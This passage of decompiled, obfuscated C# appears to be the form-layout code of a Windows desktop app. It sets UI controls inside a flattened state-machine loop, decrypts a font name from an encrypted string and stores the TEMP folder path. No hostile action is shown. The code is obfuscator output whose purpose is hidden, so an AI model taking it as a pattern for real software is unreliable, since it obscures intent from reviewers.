					num = 458;
				}
				if (num == 276)
				{
					siticoneHtmlLabel10.Location = new System.Drawing.Point(424, 100);
					num = 277;
				}
				if (num == 112)
				{
					HistoryBtn.TabIndex = 6;
					num = 113;
				}
				if (num == 373)
				{
					siticoneHtmlLabel3.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 374;
				}
				if (num == 125)
				{
					tabControl1.SelectedIndex = 0;
					num = 126;
				}
				if (num == 566)
				{
					siticonePictureBox1.TabStop = false;
					num = 567;
				}
				if (num == 259)
				{
					siticoneHtmlLabel11.Enabled = false;
					num = 260;
				}
				if (num == 471)
				{
					tabPage3.Size = new System.Drawing.Size(862, 410);
					num = 472;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 604);
		}

		static Form1()
		{
			tempFolder = Environment.GetEnvironmentVariable("TEMP");
		}
	}
}
